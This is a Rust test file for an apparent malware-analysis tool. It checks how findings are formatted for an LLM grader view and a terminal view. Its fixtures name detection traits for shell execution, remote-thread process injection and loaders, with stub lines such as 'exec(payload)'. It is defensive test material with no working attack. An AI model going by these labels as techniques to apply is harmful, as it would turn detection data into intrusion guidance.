            byte_unit(
                0,
                b"AAAAAAAAAAAAAAAA",
                vec![ctx_note("first/hit", Criticality::Suspicious, 4)],
            ),
            byte_unit(
                4096,
                b"BBBBBBBBBBBBBBBB",
                vec![ctx_note("second/hit", Criticality::Hostile, 4100)],
            ),
        ],
    );
    let output = format_tiny(&report_with_files(vec![file]));

    let a_desc = output.find("first/hit desc").expect("block A described");
    let a_bytes = output.find("AAAAAAAA").expect("block A bytes");
    let b_desc = output.find("second/hit desc").expect("block B described");
    let b_bytes = output.find("BBBBBBBB").expect("block B bytes");
    assert!(
        a_desc < a_bytes && a_bytes < b_desc && b_desc < b_bytes,
        "each block's description leads its own bytes, blocks in file order:\n{output}"
    );
}

#[test]
fn tiny_shows_all_components_only_in_top_five_files() {
    // An unreferenced component renders as context inside a top-five file, but
    // a file past the cap keeps the default gating — its lone component is not
    // resurrected as a note (it sits below the notable bare-note floor).
    let mut files: Vec<FileAnalysis> = (0..5)
        .map(|i| {
            let id = format!("cat/n::f{i}");
            let note = ctx_note(&id, Criticality::Notable, 1);
            src_file(
                i,
                &format!("/top{i}.py"),
                100 - i,
                vec![Finding {
                    desc: format!("top finding {i}").into(),
                    ..finding_with(&id, Criticality::Notable)
                }],
                vec![ctx_line(1, &format!("TOPCODE_{i} = work()"), Some(note))],
            )
        })
        .collect();

    // A top-five file additionally carrying an unreferenced component.
    let in_top = &mut files[0];
    in_top
        .findings
        .push(finding_with("blocks/c::shown", Criticality::Component));
    annotate(
        in_top,
        vec![ctx_line(
            20,
            "SHOWN_COMPONENT = side_effect()",
            Some(ctx_note("blocks/c::shown", Criticality::Component, 20)),
        )],
    );

    // A sixth file, past the cap, whose only extra signal is a component.
    files.push(src_file(
        5,
        "/tail.py",
        1,
        vec![
            Finding {
                desc: "tail notable".to_string().into(),
                ..finding_with("cat/n::tail", Criticality::Notable)
            },
            finding_with("blocks/c::hidden", Criticality::Component),
        ],
        vec![
            ctx_line(
                1,
                "TAILCODE = work()",
                Some(ctx_note("cat/n::tail", Criticality::Notable, 1)),
            ),
            ctx_line(
                20,
                "HIDDEN_COMPONENT = side_effect()",
                Some(ctx_note("blocks/c::hidden", Criticality::Component, 20)),
            ),
        ],
    ));

    let output = format_tiny(&report_with_files(files));
    assert!(
        output.contains("SHOWN_COMPONENT"),
        "a component in a top-five file renders as context\n{output}"
    );
    assert!(
        !output.contains("HIDDEN_COMPONENT"),
        "a capped file keeps default component gating\n{output}"
    );
}

#[test]
fn tiny_lists_no_capabilities_for_a_quiet_platform_signed_file() {
    let runtime_identity = identity(serde_json::json!({
        "name": {"value": "msvcp140.dll", "source": "pe.version.original_filename"},
        "organization": {"value": "Microsoft Corporation", "source": "pe.signatures[0]", "verified": true},
        "trust": "platform"
    }));
    let mut runtime = src_file(
        0,
        "/pkg.tgz!!bin/msvcp140.dll",
        30,
        vec![finding_with(
            "micro-behaviors/fs/file::position-api",
            Criticality::Notable,
        )],
        vec![],
    );
    runtime.identity = Some(runtime_identity.clone());
    let tiny = format_context(&report_with_files(vec![runtime.clone()]), &TinyOpts::tiny());
    assert!(
        tiny.contains("msvcp140.dll"),
        "the header still names it: {tiny}"
    );
    assert!(!tiny.contains("position-api"), "no capability list: {tiny}");

    // Anything suspicious on a signed file is still shown.
    runtime.findings.push(finding_with(
        "objectives/evasion/process/injection::remote-thread",
        Criticality::Suspicious,
    ));
    let tiny = format_context(&report_with_files(vec![runtime]), &TinyOpts::tiny());
    assert!(
        tiny.contains("remote-thread") || tiny.contains("evasion/process"),
        "{tiny}"
    );
}

#[test]
fn tiny_gap_lines_name_the_file_not_its_directories() {
    // The directories above a sample are the operator's filing (`hostile/`,
    // `benign/`); the LLM view names only the file, like its headers do.
    let mut file = src_file(0, "/corpus/samples/hostile/x.py", 50, vec![], vec![]);
    file.analysis_gaps = vec![crate::types::AnalysisGap::FlowGraphLimited].into();
    let report = report_with_files(vec![file]);

    let tiny = format_context(&report, &TinyOpts::tiny());
    assert!(tiny.contains("Analysis incomplete for \"x.py\""), "{tiny}");
    assert!(!tiny.contains("samples/hostile"), "{tiny}");

    // The terminal view keeps the full path for the human who filed it.
    let term = format_context(&report, &TinyOpts::terminal());
    assert!(term.contains("/corpus/samples/hostile/x.py"), "{term}");
}

fn create_test_report(findings: Vec<Finding>, yara_matches: Vec<YaraMatch>) -> AnalysisReport {
    let mut report = AnalysisReport {
        analysis_gaps: Default::default(),
        version: "3.0".to_string(),
        analysis_timestamp: Some(Utc::now()),
        target: TargetInfo {
            path: "/test/sample.bin".to_string(),
            file_type: "ELF".to_string(),
            size_bytes: 12345,
            sha256: "def456abc".to_string(),
            architectures: Some(vec!["x86_64".to_string()]),
        },
        findings,
        suppressions: vec![],
        context: vec![],
        traits: vec![],
        structure: vec![],
        functions: vec![],
        strings: vec![],
        sections: vec![],
        imports: vec![],
        exports: vec![],
        yara_matches,
        syscalls: vec![],
        filefacts: None,
        identity: None,
        cache_hit: false,
        values_tree: None,
        cached_member_kv: None,
        engine: None,
        filefacts_metrics: None,
        filefacts_metric_spans: None,
        comments: vec![],
        archive_contents: vec![],
        scanned_path: None,
        files: vec![],
        summary: None,
        metadata: crate::types::AnalysisMetadata {
            analysis_duration_ms: 100,
            tools_used: vec!["test".to_string()],
            errors: vec![],
        },
        diff: None,
    };
    // Finalize to populate files array
    report.finalize();
    report
}

#[test]
fn test_aggregate_findings_empty() {
    let findings: Vec<Finding> = vec![];
    let aggregated = aggregate_findings_by_directory(&findings);
    assert_eq!(aggregated.len(), 0);
}

#[test]
fn test_aggregate_findings_different_directories() {
    let findings = vec![
        Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "execution/shell::bash-variant".to_string().into(),
            desc: "Execute bash".to_string().into(),
            conf: 0.9,
            crit: Criticality::Hostile,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        },
        Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "net/http::get-variant".to_string().into(),
            desc: "HTTP GET request".to_string().into(),
            conf: 0.8,
            crit: Criticality::Suspicious,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        },
    ];
    let aggregated = aggregate_findings_by_directory(&findings);
    assert_eq!(aggregated.len(), 2);
    // IDs should be base trait IDs (without ::variant suffix)
    let ids: Vec<_> = aggregated.iter().map(|f| f.id.as_str()).collect();
    assert!(ids.contains(&"execution/shell"));
    assert!(ids.contains(&"net/http"));
}

#[test]
fn test_aggregate_findings_same_directory_keeps_highest_criticality() {
    let findings = vec![
        Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "execution/shell::bash-variant".to_string().into(),
            desc: "Execute bash".to_string().into(),
            conf: 0.7,
            crit: Criticality::Suspicious,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        },
        Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "execution/shell::sh-variant".to_string().into(),
            desc: "Execute sh".to_string().into(),
            conf: 0.7,
            crit: Criticality::Hostile,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        },
    ];
    let aggregated = aggregate_findings_by_directory(&findings);
    assert_eq!(aggregated.len(), 1);
    assert_eq!(aggregated[0].id, "execution/shell");
    assert_eq!(aggregated[0].crit, Criticality::Hostile);
    // Should have both trait IDs in trait_refs
    assert_eq!(aggregated[0].trait_refs.len(), 2);
}

#[test]
fn test_aggregate_findings_same_directory_keeps_highest_confidence() {
    let findings = vec![
        Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "execution/shell::bash-variant".to_string().into(),
            desc: "Execute bash".to_string().into(),
            conf: 0.6,
            crit: Criticality::Hostile,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        },
        Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "execution/shell::sh-variant".to_string().into(),
            desc: "Execute sh".to_string().into(),
            conf: 0.9,
            crit: Criticality::Hostile,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        },
    ];
    let aggregated = aggregate_findings_by_directory(&findings);
    assert_eq!(aggregated.len(), 1);
    assert_eq!(aggregated[0].id, "execution/shell");
    assert_eq!(aggregated[0].conf, 0.9);
}

#[test]
fn test_format_tiny_renders_location_less_finding_as_annotation() {
    let findings = vec![Finding {
        precomputed_spans: None,
        src: None,
        kind: FindingKind::Capability,
        trait_refs: vec![],
        id: "micro-behaviors/process/create/shell::bash"
            .to_string()
            .into(),
        desc: "Execute shell commands".to_string().into(),
        conf: 0.9,
        crit: Criticality::Suspicious,
        mbc: None,
        attack: None,
        evidence: vec![Evidence {
            method: "symbol".to_string(),
            source: "test".to_string(),
            value: "bash\nwith\twhitespace".to_string(),
            location: None,
            ..Default::default()
        }],
        match_count: 1,
        source_file: None,
        downgraded: false,
    }];
    let report = create_test_report(findings, vec![]);

    let output = format_tiny(&report);

    // No capture pass ran here, so the finding has no context window and
    // renders as a location-less annotation line: the comment marker, the
    // severity letter, then the description (no LINE, since it anchored
    // nowhere). Notable+ no-anchor noise is dropped, so the fixture is
    // Suspicious. The tiny view shows the basename, not the full `/test/` path.
    assert!(output.contains("sample.bin\tELF 12KB"));
    assert!(output.contains("// S Execute shell commands"));
}

#[test]
fn tiny_path_basenames_root_and_archive_relativizes_members() {
    // Members are always archive-relative; the `!!` delimiter becomes `/`.
    assert_eq!(
        tiny_path("/tmp/a.zip!!lib/foo.so", false),
        "a.zip/lib/foo.so"
    );
    assert_eq!(
        tiny_path("/tmp/a.zip!!b.zip!!deep", true),
        "a.zip/b.zip/deep"
    );
    // A standalone/root path is basenamed only in the LLM (tiny) view.
    assert_eq!(tiny_path("/tmp/triage/x.bin", true), "x.bin");
    assert_eq!(tiny_path("/tmp/triage/x.bin", false), "/tmp/triage/x.bin");
}

/// The printable projection keeps strings and their boundaries, drops
/// the byte escapes, and still collapses UTF-16 runs.
#[test]
fn ascii_printable_keeps_strings_and_boundaries() {
    assert_eq!(
        ascii_printable(b"\x00getpwuid\x00\x7f\xffsetuid"),
        " getpwuid setuid"
    );
    assert_eq!(ascii_printable(b"a<b\\c"), "a<b\\c");
    assert_eq!(ascii_printable(b"\x7fELF\x02\x01\x01"), " ELF ");
    assert_eq!(ascii_printable(b"P\x00r\x00o\x00d\x00\x00\x00X"), "Prod X");
    assert_eq!(ascii_printable(b"plain text"), "plain text");
}

#[test]
fn select_ids_tiny_omits_composites_and_promotes_their_legs() {
    // The LLM view shows evidence, not conclusions. A composite is cleave's
    // own verdict: withheld, with the legs it was built from promoted in its
    // place — even though those legs sit at Baseline/Component, tiers this
    // view would otherwise drop. A component the composite does not
    // reference stays dropped: promotion is for legs, not every fragment.
    let mut composite = finding_with("objectives/loader::matched", Criticality::Suspicious);
    composite.trait_refs = vec![
        "micro-behaviors/fs/read::open".to_string().into(),
        "objectives/loader::fragment".to_string().into(),
    ];
    let file = file_with_findings(vec![
        finding_with("micro-behaviors/fs/read::open", Criticality::Baseline),
        finding_with("objectives/loader::fragment", Criticality::Component),
        finding_with("objectives/loader::unused", Criticality::Component),
        composite,
    ]);

    let tiny = select_ids(&file, &TinyOpts::tiny(), 0);
    assert!(
        !tiny.contains(&"objectives/loader::matched"),
        "the composite's conclusion must not reach the grader: {tiny:?}"
    );
    assert!(tiny.contains(&"micro-behaviors/fs/read::open"), "{tiny:?}");
    assert!(tiny.contains(&"objectives/loader::fragment"), "{tiny:?}");
    assert!(!tiny.contains(&"objectives/loader::unused"), "{tiny:?}");

    // The terminal view is unchanged: a human wants the conclusion.
    let term = select_ids(&file, &TinyOpts::terminal(), 0);
    assert!(term.contains(&"objectives/loader::matched"), "{term:?}");
}

#[test]
fn select_ids_keeps_cross_file_composites_on_a_container() {
    // A cross-file composite carries source provenance (`composite_sources`)
    // but is native to no member — it exists only on the container. Treating
    // it as an inherited copy dropped it from every rendered view while it
    // stayed in the JSON.
    let mut composite = finding_with("objectives/impact::launch", Criticality::Suspicious);
    composite.src = Some(7);
    let mut file = file_with_findings(vec![composite]);
    file.composite_sources.insert(
        "objectives/impact::launch".to_string(),
        vec![crate::types::file_analysis::CompositeSource {
            file: 7,
            line: None,
            offset: None,
        }],
    );

    let term = select_ids(&file, &TinyOpts::terminal(), 0);
    assert!(term.contains(&"objectives/impact::launch"), "{term:?}");

    // An ordinary inherited copy — `src` set, no composite provenance — is
    // still rendered by its origin member, not here.
    let mut inherited = finding_with("objectives/impact::other", Criticality::Suspicious);
    inherited.src = Some(7);
    let plain = file_with_findings(vec![inherited]);
    let term = select_ids(&plain, &TinyOpts::terminal(), 0);
    assert!(!term.contains(&"objectives/impact::other"), "{term:?}");
}

#[test]
fn test_format_tiny_merges_and_annotates_context() {
    // A file with merged context: two findings on one line (collision) and
    // a context line between two hits.
    use crate::types::{ContextLine, Note};
    let report = create_test_report(
        vec![Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "net/socket".to_string().into(),
            desc: "socket usage".to_string().into(),
            conf: 0.8,
            crit: Criticality::Notable,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        }],
        vec![],
    );
    // Inject one byte-window chunk spanning a context line and the hit line;
    // the renderer splits it into physical rows (the capture pass needs file
    // bytes). Line 4 "ctx before" is bytes 40..50, then '\n', then line 5
    // "s = socket()" at byte 51; the match's 'o' sits at byte 56 → column 6.
    let mut report = report;
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 40,
                line: Some(4),
                col: Some(1),
                data: b"ctx before\ns = socket()".to_vec(),
            },
            notes: vec![Note {
                crit: Criticality::Notable,
                id: "net/socket".to_string().into(),
                desc: "socket usage".to_string().into(),
                off: 56,
                len: 6,
                conf: 0.8,
            }],
        }],
    );
    let output = format_tiny(&report);
    // Context row: bare source, no annotation and no `LINE`/severity prefix.
    assert!(output.contains("ctx before"));
    assert!(!output.contains(".\t4"));
    // Hit: a `{marker} SEV LINE:COL desc` annotation line (the description,
    // not the trait-id leaf) immediately above the unaltered source line.
    assert!(output.contains("// N 5:6 socket usage"));
    assert!(output.contains("s = socket()"));
}

#[test]
fn test_format_tiny_overlapping_notes_show_only_strongest() {
    // Two traits matching the same span on one line. The capture pass would
    // collapse them to the strongest (`conf × crit`) via `dedup_notes`; this
    // guards the render layer downstream of that — even handed both notes, the
    // LLM view announces only one finding above the (single, unaltered) source
    // line, never stacking both halves of an overlapping pair.
    use crate::types::{ContextLine, Note};
    let report = create_test_report(
        vec![
            Finding {
                precomputed_spans: None,
                src: None,
                kind: FindingKind::Capability,
                trait_refs: vec![],
                id: "a/strong".to_string().into(),
                desc: "decode+exec".to_string().into(),
                conf: 0.9,
                crit: Criticality::Hostile,
                mbc: None,
                attack: None,
                evidence: vec![],
                match_count: 0,
                source_file: None,
                downgraded: false,
            },
            Finding {
                precomputed_spans: None,
                src: None,
                kind: FindingKind::Capability,
                trait_refs: vec![],
                id: "b/weak".to_string().into(),
                desc: "exec call".to_string().into(),
                conf: 0.9,
                crit: Criticality::Notable,
                mbc: None,
                attack: None,
                evidence: vec![],
                match_count: 0,
                source_file: None,
                downgraded: false,
            },
        ],
        vec![],
    );
    let mut report = report;
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 0,
                line: Some(1),
                col: Some(1),
                data: b"exec(payload)".to_vec(),
            },
            notes: vec![
                Note {
                    crit: Criticality::Hostile,
                    id: "a/strong".to_string().into(),
                    desc: "decode+exec".to_string().into(),
                    off: 0,
                    len: 13,
                    conf: 0.9,
                },
                Note {
                    crit: Criticality::Notable,
                    id: "b/weak".to_string().into(),
                    desc: "exec call".to_string().into(),
                    off: 0,
                    len: 4,
                    conf: 0.9,
                },
            ],
        }],
    );
    let output = format_tiny(&report);
    // Only the strongest finding is announced, above the lone source line.
    assert!(output.contains("// H 1:1 decode+exec"), "{output:?}");
    assert!(!output.contains("b/weak"), "{output:?}");
    assert!(!output.contains("exec call"), "{output:?}");
    assert!(output.contains("exec(payload)"), "{output:?}");
}

#[test]
fn test_format_tiny_separates_non_contiguous_windows_with_blank_line() {
    // Two hits far apart are separate windows. Without line numbers on the
    // source rows, the LLM view must set them apart with a blank line so they
    // don't read as one run of code; adjacent rows in the same window do not.
    use crate::types::{ContextLine, Note};
    let note = |id: &str, off: u64| Note {
        crit: Criticality::Suspicious,
        id: id.to_string().into(),
        desc: format!("{id} desc").into(),
        off,
        len: 4,
        conf: 0.9,
    };
    let finding = |id: &str| Finding {
        precomputed_spans: None,
        src: None,
        kind: FindingKind::Capability,
        trait_refs: vec![],
        id: id.to_string().into(),
        desc: format!("{id} desc").into(),
        conf: 0.9,
        crit: Criticality::Suspicious,
        mbc: None,
        attack: None,
        evidence: vec![],
        match_count: 0,
        source_file: None,
        downgraded: false,
    };
    let report = create_test_report(vec![finding("a/one"), finding("b/two")], vec![]);
    let mut report = report;
    annotate(
        &mut report.files[0],
        vec![
            Win {
                line: ContextLine {
                    loc: 0,
                    line: Some(5),
                    col: Some(1),
                    data: b"first_hit(x)\n".to_vec(),
                },
                notes: vec![note("a/one", 0)],
            },
            Win {
                line: ContextLine {
                    loc: 200,
                    line: Some(50),
                    col: Some(1),
                    data: b"second_hit(y)\n".to_vec(),
                },
                notes: vec![note("b/two", 200)],
            },
        ],
    );
    let output = format_tiny(&report);
    // The two windows are split by a blank line (source row, blank, annotation).
    assert!(
        output.contains("first_hit(x)\n\n// S 50:1"),
        "windows must be blank-line separated: {output:?}"
    );
}

#[test]
fn test_format_tiny_does_not_resurrect_dominated_finding_location_less() {
    // A finding that *has* a byte offset but is missing from the windows was
    // dominated by a stronger overlapping match at that span — already
    // represented there. The LLM view must not bring it back as a location-less
    // note (it would read as a separate, anchorless finding and duplicate what
    // shows at the offset).
    use crate::types::{ContextLine, Evidence, Note};
    let finding = |id: &str, crit: Criticality| Finding {
        precomputed_spans: None,
        src: None,
        kind: FindingKind::Capability,
        trait_refs: vec![],
        id: id.to_string().into(),
        desc: format!("{id} desc").into(),
        conf: 0.9,
        crit,
        mbc: None,
        attack: None,
        evidence: vec![],
        match_count: 0,
        source_file: None,
        downgraded: false,
    };
    // `b/dominated` matched at byte 0 (same span as `a/win`), so it has a local
    // offset — the mark of a dominated finding, not a location-less one.
    let mut dominated = finding("b/dominated", Criticality::Suspicious);
    dominated.evidence = vec![Evidence::new("m", "s", "x").with_offset(0)];
    let report = create_test_report(
        vec![finding("a/win", Criticality::Hostile), dominated],
        vec![],
    );
    let mut report = report;
    // Only `a/win` won a window; `b/dominated` was dropped by the overlap pass.
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 0,
                line: Some(7),
                col: Some(1),
                data: b"winner()".to_vec(),
            },
            notes: vec![Note {
                crit: Criticality::Hostile,
                id: "a/win".to_string().into(),
                desc: "a/win desc".to_string().into(),
                off: 0,
                len: 6,
                conf: 0.9,
            }],
        }],
    );
    let output = format_tiny(&report);
    assert!(output.contains("// H 7:1 a/win desc"), "{output:?}");
    // A suspicious atom is evidence the tiny view owes its reader, so it
    // is exempt from dominance there: named once, location-less.
    assert_eq!(
        output
            .matches("// S b/dominated desc (b/dominated)")
            .count(),
        1,
        "{output:?}"
    );

    // Same rule for the terminal view: a dominated finding is suppressed
    // everywhere, never resurrected as a location-less gutter note.
    let term = format_context(&report, &TinyOpts::terminal());
    assert!(!term.contains("dominated desc"), "{term:?}");
}

/// A binary window's annotations must be locatable in the bytes below them.
///
/// Overlapping windows merge, so one block can carry a dozen detections. The
/// annotations used to be a positionless lump above a positionless lump of
/// bytes — on `/bin/ls`, sixteen `// N …` lines followed by 1.5 KB of the
/// symbol table, with nothing saying which line described which bytes. Each
/// annotation now carries its match offset in the same hex the row gutter
/// uses, and a row a detection matched in is marked `:` rather than `-`.
#[test]
fn binary_annotations_carry_offsets_that_locate_them_in_the_rows() {
    use crate::types::{ContextLine, Note};

    let note = |id: &str, off: u64| Note {
        crit: Criticality::Notable,
        id: id.to_string().into(),
        desc: format!("{id} desc").into(),
        off,
        len: 4,
        conf: 0.9,
    };
    let finding = |id: &str| Finding {
        precomputed_spans: None,
        src: None,
        kind: FindingKind::Capability,
        trait_refs: vec![],
        id: id.to_string().into(),
        desc: format!("{id} desc").into(),
        conf: 0.9,
        crit: Criticality::Notable,
        mbc: None,
        attack: None,
        evidence: vec![],
        match_count: 0,
        source_file: None,
        downgraded: false,
    };

    // One window at 0x1000, two matches in it — the second in a later row.
    // Emission order must follow the bytes, not the (equal) criticalities.
    let mut report = create_test_report(vec![finding("t/late"), finding("t/early")], vec![]);
    // The ASCII-forward view is chosen by file type; the canonical labels
    // are lowercase (`macho`, `elf`), which is what a real report carries.
    report.files[0].file_type = "elf".to_string();
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 0x1000,
                line: None,
                col: None,
                data: vec![b'A'; 192],
            },
            notes: vec![note("t/late", 0x1050), note("t/early", 0x1005)],
        }],
    );

    let out = format_tiny(&report);
    let annotations: Vec<&str> = out.lines().filter(|l| l.starts_with("// ")).collect();
    assert_eq!(
        annotations,
        vec![
            "// N 1005 t/early desc (t/early)",
            "// N 1050 t/late desc (t/late)",
        ],
        "annotations must carry their hex offset, in byte order: {out}",
    );

    // Every match offset must land in a row the gutter marks as a hit.
    let rows: Vec<(u64, char)> = out
        .lines()
        .filter_map(|l| {
            let (gutter, rest) = l.split_once(['-', ':'])?;
            let marker = l.as_bytes()[gutter.len()] as char;
            rest.starts_with(' ')
                .then(|| u64::from_str_radix(gutter, 16).ok())
                .flatten()
                .map(|off| (off, marker))
        })
        .collect();
    assert!(!rows.is_empty(), "no byte rows rendered: {out}");
    for off in [0x1005u64, 0x1050] {
        let covering = rows.iter().rfind(|(row, _)| *row <= off).copied();
        assert!(covering.is_some(), "no row covers {off:x}: {out}");
        if let Some((gutter, marker)) = covering {
            assert_eq!(
                marker, ':',
                "row {gutter:x} holds the match at {off:x} but is not marked as a hit: {out}",
            );
        }
    }
    assert!(
        rows.iter().any(|(_, marker)| *marker == '-'),
        "a row with no match must be marked as context: {out}",
    );
}

#[test]
fn test_format_tiny_long_line_slice_shows_line_col() {
    // A slice of an ultra-long single line renders as a pseudo-line labelled
    // `line:col`. The chunk starts mid-line (byte 600, column 601), so the
    // match at byte 606 is column 601 + 6 = 607 on line 1, and a leading `…`
    // marks the clipped left side.
    use crate::types::{ContextLine, Note};
    let report = create_test_report(
        vec![Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "obf/loop".to_string().into(),
            desc: "obfuscated loop".to_string().into(),
            conf: 0.9,
            crit: Criticality::Suspicious,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        }],
        vec![],
    );
    let mut report = report;
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 600,
                line: Some(1),
                col: Some(601),
                data: b"while(!![]){...}".to_vec(),
            },
            notes: vec![Note {
                crit: Criticality::Suspicious,
                id: "obf/loop".to_string().into(),
                desc: "obfuscated loop".to_string().into(),
                off: 606,
                len: 4,
                conf: 0.9,
            }],
        }],
    );
    let output = format_tiny(&report);
    assert!(output.contains("// S 1:607 obfuscated loop"), "{output:?}");
    assert!(
        output.contains("..."),
        "leading ellipsis marks the clip: {output:?}"
    );
}
